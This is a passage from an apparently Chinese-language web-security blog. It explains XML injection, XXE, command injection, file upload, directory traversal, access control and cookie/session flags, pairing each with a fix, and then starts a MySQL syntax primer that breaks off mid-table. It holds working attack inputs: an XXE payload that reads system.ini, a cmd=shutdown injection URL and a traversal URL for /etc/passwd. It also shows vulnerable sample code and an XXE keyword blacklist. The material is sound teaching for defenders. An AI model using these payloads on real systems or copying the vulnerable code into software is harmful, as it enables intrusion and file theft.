&lt;email&gt;user2@a.com&lt;/email&gt;&lt;/USER&gt;</code></pre><p>这样就无形中增加了一个攻击者自定义的管理员</p><h4 id="3-解决方案-4"><a href="#3-解决方案-4" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>在XML保存和展示前，对数据部分单独做xml escape。</p><pre><code class="hljs">String userdata = &quot;&lt;USER role=&quot;+GUESTROLE+&quot;&gt;&lt;name&gt;&quot;+    StringUtil.xmlencode(request.getParameter(&quot;name&quot;))+&quot;&lt;/name&gt;&lt;email&gt;&quot;+    StringUtil.xmlencode(rrequest.getParameter(&quot;email&quot;))+&quot;&lt;/email&gt;&lt;/USER&gt;&quot;;</code></pre><p>字符会按照下面的映射关系进行转义</p><pre><code class="hljs">&amp; --&gt; &amp;amp;&lt; --&gt; &amp;lt;&gt; --&gt; &amp;gt;&quot; --&gt; &amp;quot;&#39; --&gt; &amp;#39;</code></pre><h3 id="四、XML-injection-外部实体XXE"><a href="#四、XML-injection-外部实体XXE" class="headerlink" title="四、XML injection(外部实体XXE)"></a><strong>四、XML injection(外部实体XXE)</strong></h3><h4 id="1-XXE-的原理以及危害"><a href="#1-XXE-的原理以及危害" class="headerlink" title="1.XXE 的原理以及危害"></a><strong>1.XXE 的原理以及危害</strong></h4><p>XXE 全称 XML 外部实体注入，XML 可以使用 DTD 来规定整个 XML 的格式，DTD 中可以定义 XML 中的实体，且 DTD 可以外部引用，由于该实体会在后面的 XML 中调用，所以如果我们能控制该外部实体<br>的引用路径的话，我们就能向该路径发起请求，可以利用这个特性实现文件读取、内网探测、sqli、文件上传等操作，具体的分析我在我之前的<a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/">一篇文章</a>中介绍过了。</p><h4 id="2-攻击示例-3"><a href="#2-攻击示例-3" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>xml.php</strong></p><pre><code class="hljs">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p><strong>payload:</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p><strong>运行效果：</strong></p><p>![此处输入图片的描述][7]</p><h4 id="3-解决方案-5"><a href="#3-解决方案-5" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><h5 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h5><p><strong>PHP：</strong></p><pre><code class="hljs">libxml_disable_entity_loader(true);</code></pre><p><strong>JAVA:</strong></p><pre><code class="hljs">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false).setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</code></pre><p><strong>Python：</strong></p><pre><code class="hljs">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h5 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a><strong>方案二：手动黑名单过滤(不推荐)</strong></h5><p><strong>过滤关键词：</strong></p><pre><code class="hljs">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre><h3 id="五、System-command-injection"><a href="#五、System-command-injection" class="headerlink" title="五、System command injection"></a><strong>五、System command injection</strong></h3><h4 id="1-System-command-injection-的原理及危害"><a href="#1-System-command-injection-的原理及危害" class="headerlink" title="1.System command injection 的原理及危害"></a><strong>1.System command injection 的原理及危害</strong></h4><p>系统命令执行攻击，是指代码中有一段执行系统命令的代码，而用户的输入可以直接或者间接地作为这个命令或者是命令的一部分，所以在没有对用户的输入进行过滤或者过滤不完全的时候，恶意攻击者可以通过这个功能直接执行系统命令从而直接控制目标服务器。</p><h4 id="2-攻击示例-4"><a href="#2-攻击示例-4" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>java:</strong></p><pre><code class="hljs">Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</code></pre><p><strong>攻击者输入：</strong></p><pre><code class="hljs">http://www.xxxx.com/servlet/command?cmd=shutdown</code></pre><p>就能实现关机的功能</p><h4 id="3-解决方案-6"><a href="#3-解决方案-6" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>所有需要执行的系统命令，必须是开发人员定义好的，不允许接收用户传来的参数，加入到系统命令中去。</p><h2 id="0X04-文件操作类漏洞"><a href="#0X04-文件操作类漏洞" class="headerlink" title="0X04 文件操作类漏洞"></a><strong>0X04 文件操作类漏洞</strong></h2><h3 id="一、File-upload"><a href="#一、File-upload" class="headerlink" title="一、File upload"></a><strong>一、File upload</strong></h3><h4 id="1-File-upload-原理及危害"><a href="#1-File-upload-原理及危害" class="headerlink" title="1.File upload 原理及危害"></a><strong>1.File upload 原理及危害</strong></h4><p>Web应用程序在处理用户上传的文件时，没有判断文件的扩展名是否在允许的范围内，或者是判断过滤不到位，再或者就是存在某种可以被利用的解析漏洞，使文件被保存在服务器上，导致恶意用户可以上传可以被服务器解析的文件，甚至上传脚本木马到web服务器上，从而可以直接控制web服务器。如果配合文件包含漏洞的话能达到更好的效果。</p><h4 id="2-攻击示例-5"><a href="#2-攻击示例-5" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>下面的代码没有过滤扩展名：</strong></p><p><strong>java</strong> </p><pre><code class="hljs">PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(    request.getRealPath(&quot;/&quot;)+getFIlename(request))));ServletInputStream in = request.getInputStream();int i = in.read();while (i != -1) &#123;    pw.print((char) i);    i = in.read();&#125;pw.close();</code></pre><p><strong>php:</strong></p><pre><code class="hljs">file_put_contents($_REQUEST[&quot;filename&quot;],$_REQUEST[&quot;context&quot;]);</code></pre><p>假如第一段代码是xxxx.com下的一个web应用程序。这段代码将直接把用户上传的文件，保存在web目录中，上传后，用户可以通过</p><pre><code class="hljs">http://www.xxxx.com/jspmuma.jsp</code></pre><p>访问上传的JSP木马，控制服务器</p><blockquote><p>**注：**即使jsp文件不会被web容器解析执行，攻击者也可以上传自定义的htm文件，造成XSS攻击。</p></blockquote><h4 id="3-解决方案-7"><a href="#3-解决方案-7" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>1.检查上传文件扩展名白名单，不属于白名单内，不允许上传。<br>2.上传文件的目录必须是http请求无法直接访问到的。如果需要访问的，必须上传到其他（和web服务器不同的）域名下，并设置该目录为不解析jsp等脚本语言的目录。<br>3.上传文件要保存的文件名和目录名由系统随机生成，不可预测，更不允许用户自定义。<br>4.图片上传，要通过处理（缩略图、水印等），无异常后才能保存到服务器。<br>5.上传文件需要做日志记录</p><h3 id="二、File-download-and-Directory-traversal"><a href="#二、File-download-and-Directory-traversal" class="headerlink" title="二、File download and Directory traversal"></a><strong>二、File download and Directory traversal</strong></h3><h4 id="1-File-download-and-Directory-traversal-原理及危害"><a href="#1-File-download-and-Directory-traversal-原理及危害" class="headerlink" title="1.File download and Directory traversal 原理及危害"></a><strong>1.File download and Directory traversal 原理及危害</strong></h4><p>File download and Directory traversal，任意文件下载攻击和目录遍历攻击。</p><p>(1)处理用户请求下载文件时，允许用户提交任意文件路径，并把服务器上对应的文件直接发送给用户，这将造成任意文件下载威胁。<br>(2)如果让用户提交文件目录地址，就把目录下的文件列表发给用户，会造成目录遍历安全威胁。</p><p>恶意用户会变换目录或文件地址，下载服务器上的敏感文件、数据库链接配置文件、网站源代码等。</p><h4 id="2-攻击示例-6"><a href="#2-攻击示例-6" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>java：</strong></p><pre><code class="hljs">String path = request.getParameter(&quot;path&quot;);java.io.OutputStream os = response.getOutputStream();java.io.FileInputStream fis = new java.io.FileInputStream(path);byte[] b = new byte[1024];int i = 0;while ((i = fis.read(b)) &gt; 0 )&#123;    os.write(b, 0, i);&#125;fis.close();os.flush();os.close();</code></pre><p><strong>php:</strong></p><pre><code class="hljs">$o = file_get_contents($filename);echo $o;</code></pre><p>以上代码根据用户提交的path，从服务器上获取指定文件，展示给用户。而攻击者会变化参数中的文件名，下载服务器中的敏感文件，数据库配置文件等。</p><pre><code class="hljs">http://www.xxxx.com/filedownload.do?filename=/etc/passwd</code></pre><h4 id="3-解决方案-8"><a href="#3-解决方案-8" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>对文件操作功能，做到以下几点：</p><p>1.文件路径保存至数据库，让用户提交文件对应ID下载文件。<br>2.下载文件之前做权限判断。<br>3.文件放在web无法直接访问的目录下。<br>4.记录文件下载日志。<br>7.不允许提供目录遍历服务。</p><h2 id="0X05-访问控制类漏洞"><a href="#0X05-访问控制类漏洞" class="headerlink" title="0X05 访问控制类漏洞"></a><strong>0X05 访问控制类漏洞</strong></h2><h3 id="一、Vertical-Access-Control"><a href="#一、Vertical-Access-Control" class="headerlink" title="一、Vertical Access Control"></a><strong>一、Vertical Access Control</strong></h3><h4 id="1-Vertical-Access-Control-的原理及危害"><a href="#1-Vertical-Access-Control-的原理及危害" class="headerlink" title="1.Vertical Access Control 的原理及危害"></a><strong>1.Vertical Access Control 的原理及危害</strong></h4><p>由于web应用程序没有做权限控制，或仅仅在菜单上做了权限控制，导致的恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升目的。</p><p>这个威胁可能导致普通用户变成管理员权限。</p><h4 id="2-攻击示例-7"><a href="#2-攻击示例-7" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>一个仅仅做了菜单控制的代码：</p><pre><code class="hljs">&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;/user.jsp&quot;&gt;管理个人信息&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;%if (power.indexOf(&quot;administrators&quot;)&gt;-1)&#123;%>    <tr><td><a href="/userlist.jsp">管理所有用户</a></td></tr>    <%&#125;%&gt;</code></pre><p>恶意用户，可以直接猜测“管理所有用户”的页面，通过URL访问，看到管理员页面，以管理员身份进行非法操作</p><h4 id="3-解决方案-9"><a href="#3-解决方案-9" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>在打开管理页面URL时，首先判断当前用户是否拥有该页面的权限，如果没有权限，就判定为“权限提升”攻击，同时记录安全日志，同时建议使用成熟的权限框架处理权限问题，比如spring security。</p><h3 id="二、Horizontal-Access-Control"><a href="#二、Horizontal-Access-Control" class="headerlink" title="二、Horizontal Access Control"></a><strong>二、Horizontal Access Control</strong></h3><h4 id="1-Horizontal-Access-Control-原理与危害"><a href="#1-Horizontal-Access-Control-原理与危害" class="headerlink" title="1.Horizontal Access Control 原理与危害"></a><strong>1.Horizontal Access Control 原理与危害</strong></h4><p>Horizontal Access Control，访问控制攻击，也就是水平权限安全攻击。</p><p>Web应用程序接收到用户请求，修改某条数据时，没有判断数据的所属人，或判断数据所属人时，从用户提交的request参数（用户可控数据）中，获取了数据所属人id，导致恶意攻击者可以通过变换数据ID，或变换所属人id，修改不属于自己的数据。恶意用户可以删除或修改其他人数据。</p><h4 id="2-攻击示例-8"><a href="#2-攻击示例-8" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>访问数据层（dao），所有的更新语句操作，都可能产生这个漏洞。<br>以下代码存在这个漏洞，web应用在修改用户个人信息时，从从用户提交的request参数（用户可控数据）中，获取了userid，执行修改操作。</p><p><strong>修改用户个人信息页面</strong></p><pre><code class="hljs">&lt;form action=&quot;/struts1/edituser.htm&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;userid&quot; type=&quot;hidden&quot; value=&quot;&lt;%=userid%&gt;&quot;&gt;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;username:&lt;/td&gt;&lt;td&gt;&lt;%=rs.getString(&quot;name&quot;)%&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;passwd:&lt;/td&gt;&lt;td&gt; &lt;input name=&quot;pass&quot; value=&quot;&lt;%=rs.getString(&quot;pass&quot;)%&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;type:&lt;/td&gt;&lt;td&gt;&lt;%=rs.getString(&quot;type&quot;)%&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;realname:&lt;/td&gt;&lt;td&gt;&lt;input name=&quot;realname&quot; value=&quot;&lt;%=rs.getString(&quot;realname&quot;)%&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;email:&lt;/td&gt;&lt;td&gt; &lt;input name=&quot;email&quot; value=&quot;&lt;%=rs.getString(&quot;email&quot;)%&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;tel:&lt;/td&gt;&lt;td&gt; &lt;input name=&quot;tel&quot; value=&quot;&lt;%=rs.getString(&quot;tel&quot;)%&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;html:submit/&gt;&lt;/form&gt;</code></pre><p>表单中，将用户的useird作为隐藏字段，提交给处理修改个人信息的应用。</p><p><strong>下面代码是修改个人信息的应用</strong></p><pre><code class="hljs">int userid=Integer.valueOf( request.getParameter(&quot;userid&quot;));String email=request.getParameter(&quot;email&quot;);String tel=request.getParameter(&quot;tel&quot;);String realname=request.getParameter(&quot;realname&quot;);String pass=request.getParameter(&quot;pass&quot;);JdbcConnection conn = null;try &#123;conn = new JdbcConnection();Object[] params = new Object[5];params[0] = email;params[1] = tel;params[2] = realname;params[3] = pass;params[4] = userid;final String sql = &quot;update user set email=?,tel=?,realname=?,pass=? where userid=?&quot;;conn.execUpdate(sql,params);conn.closeConn();</code></pre><p>这段代码是从request的参数列表中，获取userid，也就是表单提交上来的userid，之后修改userid对应的用户数据。而表单中的userid是可以让用户随意修改的，如果恶意用户提交时篡改了这个值，就能欺骗服务器成为另一个用户，从而修改其他用户的信息</p><h4 id="3-解决方案-10"><a href="#3-解决方案-10" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>从用户的<strong>加密认证</strong>cookie中，获取当前用户的id，并且需要在执行的SQL语句中，加入当前用户id作为条件语句。由于是web应用控制的加密算法，所以恶意用户无法修改加密信息。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int userid=Integer.valueOf( GetUseridFromCookie(request));String email=request.getParameter(&quot;email&quot;);String tel=request.getParameter(&quot;tel&quot;);String realname=request.getParameter(&quot;realname&quot;);String pass=request.getParameter(&quot;pass&quot;);JdbcConnection conn = null;try &#123;    conn = new JdbcConnection();    Object[] params = new Object[5];        params[0] = email;    params[1] = tel;    params[2] = realname;    params[3] = pass;    params[4] = userid;    final String sql = &quot;update user set email=?,tel=?,realname=?,pass=? where userid=?&quot;;    conn.execUpdate(sql,params);    conn.closeConn();</code></pre><p>代码中通过GetUseridFromCookie，从加密的COOKIE中获取了当前用户的id，并加入到SQL语句中的WHERE条件中</p><h2 id="0X06-Session-管理"><a href="#0X06-Session-管理" class="headerlink" title="0X06 Session 管理"></a><strong>0X06 Session 管理</strong></h2><h3 id="一、Cookie-httponly-flag"><a href="#一、Cookie-httponly-flag" class="headerlink" title="一、Cookie httponly flag"></a><strong>一、Cookie httponly flag</strong></h3><h4 id="1-Cookie-httponly-flag的原理及危害"><a href="#1-Cookie-httponly-flag的原理及危害" class="headerlink" title="1.Cookie httponly flag的原理及危害"></a><strong>1.Cookie httponly flag的原理及危害</strong></h4><p>Cookie http only，是设置COOKIE时，可以设置的一个属性，如果COOKIE没有设置这个属性，该COOKIE值可以被页面 js 脚本读取</p><p>当攻击者发现一个XSS漏洞时，通常会写一段页面脚本，窃取用户的COOKIE，如果不设置这个属性就会出现因为XSS漏洞导致大面积用户COOKIE被盗，从而严重地危害业务安全。</p><h4 id="2-攻击示例-9"><a href="#2-攻击示例-9" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>设置cookie的代码</p><pre><code class="hljs">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;));</code></pre><p>这段代码没有设置http only属性，攻击者可以通过 JS 脚本获取用户的 cookie，详情见 XSS 漏洞</p><h4 id="3-解决方案-11"><a href="#3-解决方案-11" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>设置cookie时，加入属性即可</p><pre><code class="hljs">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly&quot;);</code></pre><h4 id="4-常见问题-1"><a href="#4-常见问题-1" class="headerlink" title="4.常见问题"></a><strong>4.常见问题</strong></h4><p>httponly已经可以防止用户cookie被窃取，还需要做XSS防御吗？</p><p>这个flag只能增加攻击者的难度，不能达到完全防御XSS攻击，并且 XSS 能做的事非常的多，不只是获取用户的 cookie </p><h3 id="二、Cookie-Secure-flag"><a href="#二、Cookie-Secure-flag" class="headerlink" title="二、Cookie Secure flag"></a><strong>二、Cookie Secure flag</strong></h3><h4 id="1-Cookie-Secure-flag-的概念及优点"><a href="#1-Cookie-Secure-flag-的概念及优点" class="headerlink" title="1.Cookie Secure flag 的概念及优点"></a><strong>1.Cookie Secure flag 的概念及优点</strong></h4><p>Cookie Secure，是设置COOKIE时，可以设置的一个属性，设置了这个属性后，只有在https访问时，浏览器才会发送该COOKIE给服务器。</p><p>浏览器默认只要使用http请求一个站点，就会发送明文cookie，如果网络中有监控，可能被截获。<br>如果web应用网站全站是https的，可以设置cookie加上Secure属性，这样浏览器就只会在https访问时，发送cookie，这样攻击者即使窃听网络，也无法获取用户明文cookie</p><h4 id="2-攻击示例-10"><a href="#2-攻击示例-10" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>设置cookie的代码</p><pre><code class="hljs">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly&quot;);</code></pre><p>这段代码没有设置Secure属性，如果此时进行网络监听，就可以看到没有设置Secure属性的COOKIE发送的数据包。</p><h4 id="3-解决方案-12"><a href="#3-解决方案-12" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>在设置认证COOKIE时，加入Secure 属性。</p><p><strong>代码：</strong></p><pre><code class="hljs">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly ; Secure &quot;);</code></pre><p>此时如果再次访问http网站，抓数据包可以看到，已经不再发送这个COOKIE了。</p><h3 id="三、Session-Expires"><a href="#三、Session-Expires" class="headerlink" title="三、Session Expires"></a><strong>三、Session Expires</strong></h3><h4 id="1-Session-Expires-的原理及危害"><a href="#1-Session-Expires-的原理及危害" class="headerlink" title="1.Session Expires 的原理及危害"></a><strong>1.Session Expires 的原理及危害</strong></h4><p>Session Expires，Session有效期安全攻击(会话固定漏洞)。</p><p>由于Session没有在web应用中设置强制超时时间，攻击者一旦曾经获取过用户的Session，就可以一直使用，从而可以伪造用户的身份做任何事。</p><h4 id="2-攻击示例-11"><a href="#2-攻击示例-11" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>设置cookie的代码</p><pre><code class="hljs">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly ; Secure &quot;);</code></pre><p>这段代码没有在服务器中设置强制超时时间。利用网络监听或者xss等一些手段获取用户的cookie，之后就可以一直使用用户身份登录。</p><h4 id="3-解决方案-13"><a href="#3-解决方案-13" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>在设置认证cookie中，加入两个时间，一个是“即使一直在活动，也要失效”的时间，一个是“长时间不活动的失效时间”。并在web应用中，首先判断两个时间是否已超时，再执行其他操作。</p><p><strong>示例：</strong></p><pre><code class="hljs">// 判断会员的cookie是否过期if (isLogin) &#123;    String timeStampStr = (String) map.get(UserAuthenticationContext.TIMESTAMP);    long loginTime = 0;    try &#123;        loginTime = Long.parseLong(timeStampStr);    &#125; catch (NumberFormatException e) &#123;        if (logger.isInfoEnabled()) &#123;        logger.info(&quot; loginId: &quot; + usr.getLoginId() + &quot; timestamp has exception &quot; + timeStampStr);        &#125;    &#125;    long now = System.currentTimeMillis() / 1000;    if (now - loginTime &gt; UserAuthenticationContext.COOKIE_VALIDITY) &#123;        usr.setAuthenticated(false, true);        if (logger.isInfoEnabled()) &#123;            logger.info(&quot;loginId: &quot; + usr.getLoginId() + &quot; loginTime: &quot; + loginTime + &quot; nowTime: &quot; + now);        &#125;    &#125;&#125;</code></pre><h2 id="0X07-总结"><a href="#0X07-总结" class="headerlink" title="0X07 总结"></a>0X07 总结</h2><p>实际上漏洞类型应该有更多，但是这里我仅仅是列出了比较常见的或者说是比较 “大” 的漏洞，对于一些更细小的漏洞没有阐述，这或许等过一段时间再回来补充。</p><p>  [786%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E&#x2F;<br>  <a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/">6</a>:  <a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/XXE%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6.png">https://picture-1253331270.cos.ap-beijing.myqcloud.com/XXE%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6.png</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL 基础语法的详细归纳</title>
    <link href="/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>做安全最困难的恐怕就是知识点过于杂碎，涉及面过于广阔，所以趁还记得，没事就总结完善备忘一下(参考一些资料，并加入一些自己使用过程中的理解)，以防老了失忆，平时短路了拿出来查一下也是不错的。</p><h2 id="0X01-基本语法"><a href="#0X01-基本语法" class="headerlink" title="0X01 基本语法"></a><strong>0X01 基本语法</strong></h2><h3 id="这一小节主要介绍的是一些增删改查的基本语法"><a href="#这一小节主要介绍的是一些增删改查的基本语法" class="headerlink" title="这一小节主要介绍的是一些增删改查的基本语法"></a><strong>这一小节主要介绍的是一些增删改查的基本语法</strong></h3><h3 id="1-select"><a href="#1-select" class="headerlink" title="(1)select"></a><strong>(1)select</strong></h3><p>mysql 中 select 命令中允许不出现数据库或者数据表的名字，也就是可以没有 from ，这种情况下能将执行结果返回成一个单行单列的表格，例如 select now();返回当前时间。</p><span id="more"></span><h3 id="2-count"><a href="#2-count" class="headerlink" title="(2)count()"></a><strong>(2)count()</strong></h3><p>select count(列) … 可以确定数据表中的记录条数 </p><h3 id="3-limit-offset-n"><a href="#3-limit-offset-n" class="headerlink" title="(3)limit offset,n"></a><strong>(3)limit offset,n</strong></h3><p>limit offset,n 指定输出从 offset 开始的 n 条数据 ，<strong>其中 offset 是从 0 开始的</strong>，例如 limit 2,2 表示跳过两条数据，从第三条数据开始输出第三第四条数据(offset 不写时，默认为0)</p><h3 id="4-order-by"><a href="#4-order-by" class="headerlink" title="(4)order by"></a><strong>(4)order by</strong></h3><p>order by column 表示按照某一列对查询结果进行排序</p><h3 id="5-where-having"><a href="#5-where-having" class="headerlink" title="(5)where&#x2F;having"></a><strong>(5)where&#x2F;having</strong></h3><p>where&#x2F;having 表示对行进行筛选，其中 where 的优先级高于 Having ，having 可以和 group by 配合使用，但是 where 不可以</p><h3 id="6-join"><a href="#6-join" class="headerlink" title="(6)join"></a><strong>(6)join</strong></h3><p>select table1.xxx,table2.xxx from table1 left join table2 on table1.yyy&#x3D;table2.zzz&#x2F;using(xxx);   是用来扩展查询结果的列的，两个表有键值是关联的，如果没有关联就相当于笛卡尔积，没什么太大的意义</p><p><strong>下表是常用的一些语句模型</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Mysql%E5%9F%BA%E7%A1%801.png" alt="此处输入图片的描述"></p><h3 id="7-union"><a href="#7-union" class="headerlink" title="(7)union"></a><strong>(7)union</strong></h3><p>union 实现的是行的扩展，它将两个查询的结果合并在一起，并要求两个查询的列个数相同，数据类型相同，如果不同，系统将会自动将 union 后面的数据的类型转换成前面的对应类型(union 是 mysql 中唯一的集合分隔符)</p><h3 id="8-group-by"><a href="#8-group-by" class="headerlink" title="(8)group by"></a><strong>(8)group by</strong></h3><p>group by 配合如 count() sum() min() max() 等统计函数 计算有相同字段的行的另一些字段的统计数据，如果是想输出有相同字段的行的另一字段的所有数据，可以使用 group_concat() 这个统计函数，否则只能输出第一个，group by … with rollup 可以在结果的最后一行添加一个计算总和的行</p><h3 id="9-备份与还原数据表"><a href="#9-备份与还原数据表" class="headerlink" title="(9)备份与还原数据表"></a><strong>(9)备份与还原数据表</strong></h3><h4 id="备份："><a href="#备份：" class="headerlink" title="备份："></a><strong>备份：</strong></h4><pre><code class="hljs">create table newtable select * from oldtable;</code></pre><h4 id="还原："><a href="#还原：" class="headerlink" title="还原："></a><strong>还原：</strong></h4><pre><code class="hljs">delete from oldtable;insert into oldtable select * from newtable;</code></pre><h3 id="10-备份和还原数据库"><a href="#10-备份和还原数据库" class="headerlink" title="(10)备份和还原数据库"></a><strong>(10)备份和还原数据库</strong></h3><p>使用外部工具 mysqldump</p><h4 id="备份：-1"><a href="#备份：-1" class="headerlink" title="备份："></a><strong>备份：</strong></h4><pre><code class="hljs">mysqldump -u loginame -p   dbname &gt; backupfile</code></pre><h4 id="还原：-1"><a href="#还原：-1" class="headerlink" title="还原："></a><strong>还原：</strong></h4><p>没有专门的恢复工具，我们直接使用下面的命令</p><pre><code class="hljs">mysql -u loginame -p   dbname &lt; backupfile</code></pre><p>或者我们直接就能在交互模式下重建</p><pre><code class="hljs">create database dbname;use dbname;source backupfile;</code></pre><h3 id="11-插入数据"><a href="#11-插入数据" class="headerlink" title="(11)插入数据"></a><strong>(11)插入数据</strong></h3><pre><code class="hljs">intert into tablename(column1,column2...) values (value1,value2...),(value3,value4...);</code></pre><h3 id="12-更新数据"><a href="#12-更新数据" class="headerlink" title="(12)更新数据"></a><strong>(12)更新数据</strong></h3><pre><code class="hljs">update tablename set column1=value1,column2=value2,...where columnID=ID;</code></pre><h3 id="13-删除数据"><a href="#13-删除数据" class="headerlink" title="(13)删除数据"></a><strong>(13)删除数据</strong></h3><pre><code class="hljs">delect from tablename where ID=ID;</code></pre><h3 id="14-修改数据表"><a href="#14-修改数据表" class="headerlink" title="(14)修改数据表"></a><strong>(14)修改数据表</strong></h3><p><strong>增加一个数据列：</strong></p><pre><code class="hljs">alert table tablename add columnname clotype clooptions;</code></pre><p><strong>修改一个数据列:</strong></p><pre><code class="hljs">alert table tablename change oldcolname newcolname coltype coloptions;</code></pre><h3 id="15-information-schema-数据表家族"><a href="#15-information-schema-数据表家族" class="headerlink" title="(15)information_schema 数据表家族"></a><strong>(15)information_schema 数据表家族</strong></h3><p>这是在 mysql5.0 以后引入的机制，有了这个机制，我们能在这些数据表中使用 select 命令检索有关数据库、数据表、数据列的元数据。</p><blockquote><p>这是一个非常重要的机制，最明显的体现就在于使用 sqlmap 跑 MySQL 数据库的时候为什么那么方便，分分钟就能把所有的数据库和表列出来，有些名字甚至是很复杂的都没有丝毫的影响，但是如果你尝试跑 sql server 的数据库，你就会发现情况大不相同， sqlmap 会告诉你需要进行暴力破解，然后就会从他自带的字典中开始遍历，不仅时间非常的长，而且效果也很差，一些自定义的不常见的名字永远都不可能猜出来。</p><p><strong>注意一下</strong>, information_schema 这个数据库是虚拟的，是在计算机上没有对应的文件的（我们知道数据库也是一个文件，都存储在计算机上，只不过不是纯文本文件罢了，有时候我们还能利用这个文件进行<br>getshell操作）</p></blockquote><p>所以我们也不能直接使用 use information_schema 、show databases 、select * from information_schema.schemata 来查看有关信息</p><p>但是我们能通过 show tables from information_schema 、show columns from information_schema.columns 查看这个数据库内部的信息</p><pre><code class="hljs">mysql&gt; select * from information_schema.schemata;+--------------+--------------------+----------------------------+------------------------+----------+| CATALOG_NAME | 